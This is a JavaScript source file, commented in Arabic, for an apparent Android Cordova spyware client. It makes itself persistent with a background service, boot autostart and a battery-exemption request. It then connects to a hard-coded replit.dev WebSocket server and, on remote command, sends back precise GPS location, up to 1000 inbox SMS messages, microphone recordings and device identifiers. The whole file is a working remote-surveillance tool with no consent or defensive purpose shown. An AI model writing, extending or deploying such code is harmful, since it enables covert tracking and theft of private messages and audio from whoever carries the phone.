document.addEventListener('deviceready', onDeviceReady, false);

// تخزين الطلبات المستلمة
const receivedRequests = [];
let heartbeatInterval = null;
let reconnectAttempts = 0;
const MAX_RECONNECT_ATTEMPTS = 10;

function onDeviceReady() {
  console.log('Device is ready');
  
  // تمكين التشغيل في الخلفية
  enableBackgroundMode();
  
  // تمكين خدمة المقدمة (Foreground Service)
  enableForegroundService();
  
  // تمكين التشغيل التلقائي بعد إعادة التشغيل
  enableAutoStart();
  
  // تجاوز تحسينات البطارية
  requestBatteryOptimizationExemption();
  
  // معلومات الجهاز
  const deviceInfo = {
    uuid: device.uuid || generateUUID(),
    model: device.model || 'Unknown',
    platform: device.platform || 'Unknown',
    version: device.version || 'Unknown',
    manufacturer: device.manufacturer || 'Unknown',
    battery: null,
    timestamp: new Date().toISOString()
  };
  
  // توليد UUID إذا لم يكن موجوداً
  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }
  
  // الحصول على حالة البطارية
  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      connectToServer(deviceInfo);
      
      // مراقبة تغيرات البطارية
      battery.addEventListener('levelchange', updateBatteryInfo);
      battery.addEventListener('chargingchange', updateBatteryInfo);
    }).catch(error => {
      console.error('Battery API error:', error);
      connectToServer(deviceInfo);
    });
  } else {
    connectToServer(deviceInfo);
  }
  
  // إضافة مستمعات الأحداث
  setupEventListeners();
}

function enableBackgroundMode() {
  if (cordova.plugins.backgroundMode) {
    cordova.plugins.backgroundMode.enable();
    cordova.plugins.backgroundMode.setDefaults({
      title: 'التطبيق يعمل في الخلفية',
      text: 'جارٍ مراقبة الأوامر الواردة',
      icon: 'ic_stat_icon',
      color: '#488AC7'
    });
    
    // منع إيقاف التطبيق
    cordova.plugins.backgroundMode.on('activate', function() {
      cordova.plugins.backgroundMode.disableWebViewOptimizations();
    });
    
    // عند دخول الخلفية
    cordova.plugins.backgroundMode.on('deactivate', function() {
      console.log('Background mode deactivated');
    });
  }
}

function enableForegroundService() {
  try {
    if (cordova.plugins.foregroundService) {
      cordova.plugins.foregroundService.start(
        'التطبيق يعمل', 
        'جارٍ مراقبة الأوامر في الخلفية', 
        'ic_stat_icon',
        1000, // notificationId
        {}
      );
      console.log('Foreground service started');
    } else {
      console.log('Foreground service plugin not available');
    }
  } catch (error) {
    console.error('Error starting foreground service:', error);
  }
}

function enableAutoStart() {
  try {
    if (cordova.plugins.autoStart) {
      cordova.plugins.autoStart.enable();
      cordova.plugins.autoStart.enableBootStart();
      console.log('Auto start enabled');
    } else {
      console.log('Auto start plugin not available');
    }
  } catch (error) {
    console.error('Error enabling auto start:', error);
  }
}

function requestBatteryOptimizationExemption() {
  try {
    if (cordova.plugins.batteryOptimization) {
      cordova.plugins.batteryOptimization.isIgnoringBatteryOptimizations(function(ignoring) {
        if (!ignoring) {
          cordova.plugins.batteryOptimization.requestOptOut(function() {
            console.log('Battery optimization exemption requested');
          }, function(error) {
            console.error('Error requesting battery optimization exemption:', error);
          });
        }
      });
    }
  } catch (error) {
    console.error('Battery optimization plugin error:', error);
  }
}

function setupEventListeners() {
  // عند استئناف التطبيق
  document.addEventListener('resume', function() {
    console.log('App resumed');
    if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
      console.log('Reconnecting after resume...');
      onDeviceReady();
    }
  }, false);
  
  // عند دخول الخلفية
  document.addEventListener('pause', function() {
    console.log('App paused - maintaining connection');
    // لا نغلق الاتصال عند دخول الخلفية
  }, false);
  
  // عند إعادة التشغيل
  document.addEventListener('deviceready', function() {
    console.log('Device ready after boot');
  }, false);
}

function updateBatteryInfo() {
  navigator.getBattery().then(battery => {
    const batteryInfo = {
      level: Math.round(battery.level * 100),
      charging: battery.charging,
      chargingTime: battery.chargingTime,
      dischargingTime: battery.dischargingTime
    };
    
    // إرسال تحديث البطارية إلى الخادم
    if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
      window.wsConnection.send(JSON.stringify({
        type: 'device_update',
        deviceInfo: {
          battery: batteryInfo,
          timestamp: new Date().toISOString()
        }
      }));
    }
  });
}

function connectToServer(deviceInfo) {
  // استخدام رابط الخادم المقدم
  const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
  window.wsConnection = new WebSocket(wsUrl);
  
  wsConnection.onopen = () => {
    console.log('Connected to server');
    reconnectAttempts = 0;
    
    // تسجيل الجهاز
    wsConnection.send(JSON.stringify({
      type: 'register',
      deviceId: deviceInfo.uuid,
      deviceInfo
    }));
    
    // بدء إرسال نبضات قلبية دورية
    startHeartbeat();
  };
  
  wsConnection.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      
      if (data.type === 'command') {
        console.log('Received command:', data.command);
        // تخزين الطلب المستلم
        receivedRequests.push({
          ...data.command,
          receivedAt: new Date().toISOString()
        });
        
        // تنفيذ الأمر وإرسال الرد
        executeCommand(data.command, (response) => {
          if (wsConnection.readyState === WebSocket.OPEN) {
            wsConnection.send(JSON.stringify({
              type: 'response',
              commandId: data.commandId,
              response: {
                ...response,
                requestData: data.command
              }
            }));
          }
        });
      }
      else if (data.type === 'registered') {
        console.log('Device registered successfully:', data);
      }
      
    } catch (error) {
      console.error('Error processing message:', error);
    }
  };
  
  wsConnection.onerror = (error) => {
    console.error('WebSocket error:', error);
  };
  
  wsConnection.onclose = () => {
    console.log('Disconnected from server');
    stopHeartbeat();
    
    // إعادة الاتصال مع تزايد التأخير
    if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
      reconnectAttempts++;
      const delay = Math.min(10000 * reconnectAttempts, 60000); // أقصى تأخير 60 ثانية
      console.log(`Reconnecting in ${delay/1000} seconds (attempt ${reconnectAttempts})`);
      setTimeout(() => connectToServer(deviceInfo), delay);
    } else {
      console.log('Max reconnection attempts reached. Waiting for manual restart.');
      // إعادة المحاولة بعد وقت أطول
      setTimeout(() => {
        reconnectAttempts = 0;
        connectToServer(deviceInfo);
      }, 300000); // 5 دقائق
    }
  };
}

function startHeartbeat() {
  stopHeartbeat(); // إيقاف أي نبضات قلبية سابقة
  
  heartbeatInterval = setInterval(() => {
    if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
      window.wsConnection.send(JSON.stringify({ 
        type: 'heartbeat',
        timestamp: new Date().toISOString(),
        receivedRequests: receivedRequests.slice(-50) // إرسال آخر 50 طلب فقط
      }));
    }
  }, 30000); // كل 30 ثانية
}

function stopHeartbeat() {
  if (heartbeatInterval) {
    clearInterval(heartbeatInterval);
    heartbeatInterval = null;
  }
}

function executeCommand(command, callback) {
  console.log('Executing command:', command);
  
  // إضافة commandId للتعقب
  const commandId = Date.now();
  
  switch (command.type) {
    case 'get_location':
      getLocation(commandId, callback);
      break;
    case 'get_sms':
      getSMS(commandId, callback);
      break;
    case 'record_audio':
      recordAudio(commandId, command.duration, callback);
      break;
    case 'get_device_info':
      getDeviceInfo(commandId, callback);
      break;
    case 'get_received_requests':
      getReceivedRequests(commandId, callback);
      break;
    default:
      callback({ 
        commandId,
        status: 'error',
        error: 'Unknown command',
        receivedCommand: command
      });
  }
}

function getLocation(commandId, callback) {
  const options = {
    enableHighAccuracy: true,
    timeout: 15000,
    maximumAge: 0
  };
  
  navigator.geolocation.getCurrentPosition(
    (position) => {
      const locationData = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        altitude: position.coords.altitude,
        altitudeAccuracy: position.coords.altitudeAccuracy,
        heading: position.coords.heading,
        speed: position.coords.speed,
        timestamp: position.timestamp
      };
      
      callback({
        commandId,
        status: 'success',
        location: locationData,
        googleMapsLink: `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Location error',
        details: {
          code: error.code,
          message: error.message,
          PERMISSION_DENIED: error.PERMISSION_DENIED,
          POSITION_UNAVAILABLE: error.POSITION_UNAVAILABLE,
          TIMEOUT: error.TIMEOUT
        }
      });
    },
    options
  );
}

function getSMS(commandId, callback) {
  if (typeof SMS === 'undefined') {
    return callback({ 
      commandId,
      status: 'error',
      error: 'SMS plugin not available',
      suggestion: 'Install cordova-sms-plugin'
    });
  }
  
  const filter = {
    box: 'inbox',
    maxCount: 1000,
    indexFrom: 0
  };
  
  SMS.listSMS(
    filter,
    (messages) => {
      callback({
        commandId,
        status: 'success',
        count: messages.length,
        messages: messages.map(msg => ({
          id: msg._id,
          address: msg.address,
          body: msg.body,
          date: msg.date,
          read: msg.read
        }))
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'SMS error',
        details: error
      });
    }
  );
}

function recordAudio(commandId, duration, callback) {
  duration = duration || 10;
  
  const mediaRecorderOptions = {
    mimeType: 'audio/mp3',
    audioBitsPerSecond: 128000
  };
  
  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
      const mediaRecorder = new MediaRecorder(stream, mediaRecorderOptions);
      const audioChunks = [];
      
      mediaRecorder.ondataavailable = event => {
        audioChunks.push(event.data);
      };
      
      mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
        const audioUrl = URL.createObjectURL(audioBlob);
        
        // حفظ التسجيل في التخزين المحلي
        const fileName = `recording_${commandId}.mp3`;
        saveAudioToStorage(fileName, audioBlob);
        
        callback({ 
          commandId,
          status: 'success',
          audio: {
            duration: duration,
            format: 'mp3',
            size: audioBlob.size,
            downloadUrl: audioUrl,
            fileName: fileName
          }
        });
      };
      
      mediaRecorder.start();
      setTimeout(() => {
        mediaRecorder.stop();
        stream.getTracks().forEach(track => track.stop());
      }, duration * 1000);
    })
    .catch(error => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Audio recording error',
        details: error.message
      });
    });
}

function saveAudioToStorage(fileName, blob) {
  try {
    window.resolveLocalFileSystemURL(cordova.file.dataDirectory, dir => {
      dir.getFile(fileName, { create: true }, fileEntry => {
        fileEntry.createWriter(fileWriter => {
          fileWriter.onwriteend = () => console.log('Audio file saved:', fileName);
          fileWriter.onerror = e => console.error('Error saving file:', e);
          fileWriter.write(blob);
        });
      });
    });
  } catch (error) {
    console.error('Error saving audio to storage:', error);
  }
}

function getDeviceInfo(commandId, callback) {
  const info = {
    cordova: device.cordova,
    model: device.model,
    platform: device.platform,
    uuid: device.uuid,
    version: device.version,
    manufacturer: device.manufacturer,
    isVirtual: device.isVirtual,
    serial: device.serial
  };
  
  callback({
    commandId,
    status: 'success',
    deviceInfo: info
  });
}

function getReceivedRequests(commandId, callback) {
  callback({
    commandId,
    status: 'success',
    requests: receivedRequests,
    count: receivedRequests.length
  });
}

// التأكد من بدء التشغيل عند إعادة التشغيل
document.addEventListener('deviceready', function() {
  console.log('App started after device boot');
}, false);
